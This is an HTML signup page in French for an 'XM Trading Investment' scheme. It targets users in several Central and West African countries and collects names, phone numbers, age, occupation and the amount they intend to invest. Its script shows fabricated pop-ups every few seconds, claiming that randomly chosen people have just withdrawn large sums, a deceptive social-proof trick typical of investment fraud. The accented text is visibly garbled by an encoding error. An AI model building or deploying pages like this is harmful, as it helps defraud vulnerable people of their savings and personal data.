<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Inscription XM Trading</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }
    body {
      font-family: 'Roboto', sans-serif;
      background: #f0f2f5;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    header, footer {
      background: #000;
      color: #fff;
      text-align: center;
      padding: 15px 10px;
    }
    header h1, footer p {
      font-size: 1.2rem;
    }
    main {
      flex: 1;
      display: flex;
      justify-content: center;
      padding: 20px 10px;
    }
    .card {
      background: #fff;
      width: 100%;
      max-width: 450px;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      position: relative;
    }
    h2 {
      text-align: center;
      color: #1e3c72;
      font-size: 1.5rem;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin: 12px 0 5px;
      color: #444;
      font-size: 1rem;
    }
    input, select, button {
      width: 100%;
      padding: 14px 12px;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      background: #f9fbfd;
      outline: none;
    }
    input:focus, select:focus {
      border-color: #1e3c72;
      background: #fff;
    }
    .phone-group {
      display: flex;
      gap: 8px;
    }
    .dial-code {
      flex: 0 0 80px;
      background: #f0f4f8;
      text-align: center;
      border-radius: 8px;
      border: 1px solid #ccc;
      padding: 14px 0;
    }
    button {
      background: #1e3c72;
      color: #fff;
      font-weight: 600;
      margin-top: 20px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background: #16325c;
    }
    #notifications {
      position: absolute;
      top: -10px;
      left: 50%;
      transform: translateX(-50%);
      width: calc(100% - 30px);
      pointer-events: none;
      z-index: 10;
    }
    .notif {
      background: rgba(30,60,114,0.85);
      color: #fff;
      padding: 10px 15px;
      border-radius: 8px;
      font-size: 1rem;
      margin-bottom: 8px;
      text-align: center;
      backdrop-filter: blur(3px);
      animation: slideIn 0.4s, fadeOut 0.4s 4.6s forwards;
    }
    @keyframes slideIn {
      from { transform: translate(-50%, -100%); opacity: 0; }
      to { transform: translate(-50%, 0); opacity: 1; }
    }
    @keyframes fadeOut {
      to { opacity: 0; height: 0; padding: 0; margin: 0; }
    }
    #thankyou {
      display: none;
      text-align: center;
      padding: 20px;
      background: #1e3c72;
      color: #fff;
      border-radius: 12px;
      margin-top: 10px;
    }
    #thankyou h2 { font-size: 1.5rem; margin-bottom: 10px; }
    #thankyou p { font-size: 1rem; }
    #thankyou .cta {
      display: inline-block;
      background: #fff;
      color: #1e3c72;
      padding: 10px 20px;
      border-radius: 8px;
      text-decoration: none;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <header>
    <h1>XM Trading Investment</h1>
  </header>

  <main>
    <div class="card">
      <div id="notifications"></div>

      <h2 id="form-title">Inscription</h2>
      <form id="registration-form" name="inscription-xm" method="POST" data-netlify="true" action="/?success=true" netlify-honeypot="bot-field">
        <input type="hidden" name="form-name" value="inscription-xm">
        <p style="display:none;"><label>Ne remplissez pas <input name="bot-field"></label></p>

        <label for="nom">Nom</label>
        <input type="text" id="nom" name="nom" placeholder="Votre nom" required>

        <label for="prenom">PrÃ©nom</label>
        <input type="text" id="prenom" name="prenom" placeholder="Votre prÃ©nom" required>

        <label for="pays">Pays</label>
        <select id="pays" name="pays" required>
          <option value="" disabled selected>Choisissez votre pays</option>
          <option>Cameroun</option><option>SÃ©nÃ©gal</option><option>CÃ´te d'Ivoire</option><option>RDC</option>
        </select>

        <label>TÃ©lÃ©phone</label>
        <div class="phone-group">
          <input type="text" id="dial-code" name="dial-code" class="dial-code" readonly placeholder="+xxx">
          <input type="tel" id="phone" name="phone" placeholder="NumÃ©ro" required>
        </div>

        <label for="montant">Montant Ã  investir</label>
        <input type="number" id="montant" name="montant" placeholder="Ex: 1000" required>

        <label for="devise">Devise</label>
        <select id="devise" name="devise" required>
          <option value="" disabled selected>Choisissez une devise</option>
          <option>FCFA</option><option>USD</option><option>EUR</option>
        </select>

        <label for="age">Ã‚ge</label>
        <input type="number" id="age" name="age" min="18" required>

        <label for="metier">MÃ©tier</label>
        <input type="text" id="metier" name="metier" placeholder="Votre mÃ©tier" required>

        <button type="submit">Valider lâ€™inscription</button>
      </form>

      <div id="thankyou">
        <h2>ðŸŽ‰ FÃ©licitations <span id="thx-nom"></span>!</h2>
        <p>Inscription validÃ©e pour un investissement de <strong><span id="thx-montant"></span> <span id="thx-devise"></span></strong>.</p>
        <a href="#" class="cta">Contacter lâ€™admin</a>
      </div>
    </div>
  </main>

  <footer>
    <p>&copy; 2025 XM Trading Investment</p>
  </footer>

  <script>
    const form = document.getElementById('registration-form');
    form.addEventListener('submit', () => {
      localStorage.setItem('xm_nom', form.nom.value);
      localStorage.setItem('xm_prenom', form.prenom.value);
      localStorage.setItem('xm_montant', form.montant.value);
      localStorage.setItem('xm_devise', form.devise.value);
    });

    const params = new URLSearchParams(window.location.search);
    if (params.get('success') === 'true') {
      form.style.display = 'none';
      document.getElementById('form-title').style.display = 'none';
      const nom = localStorage.getItem('xm_nom') || '';
      const prenom = localStorage.getItem('xm_prenom') || '';
      const montant = localStorage.getItem('xm_montant') || '';
      const devise = localStorage.getItem('xm_devise') || '';
      document.getElementById('thx-nom').innerText = prenom + ' ' + nom;
      document.getElementById('thx-montant').innerText = montant;
      document.getElementById('thx-devise').innerText = devise;
      document.getElementById('thankyou').style.display = 'block';
    }

    const codes = {"Cameroun":"+237","SÃ©nÃ©gal":"+221","CÃ´te d'Ivoire":"+225","RDC":"+243"};
    document.getElementById('pays').addEventListener('change', e => {
      document.getElementById('dial-code').value = codes[e.target.value] || '';
    });

    const names = ["Amina","Koffi","Fatou","Ibrahim","Adjoa","Kwame","Ama","Moussa"];
    const currencies = {"FCFA":500000,"USD":300,"EUR":300};
    const notifBox = document.getElementById('notifications');

    function randomNotif() {
      const name = names[Math.floor(Math.random()*names.length)];
      const devs = Object.keys(currencies);
      const dev = devs[Math.floor(Math.random()*devs.length)];
      const amount = Math.floor(currencies[dev] + Math.random()*currencies[dev]);
      const div = document.createElement('div');
      div.className = 'notif';
      div.innerText = `${name} vient de retirer ${amount.toLocaleString()} ${dev}`;
      notifBox.appendChild(div);
      setTimeout(() => div.remove(), 5000);
    }
    setInterval(randomNotif, 4000);
  </script>
</body>
</html>
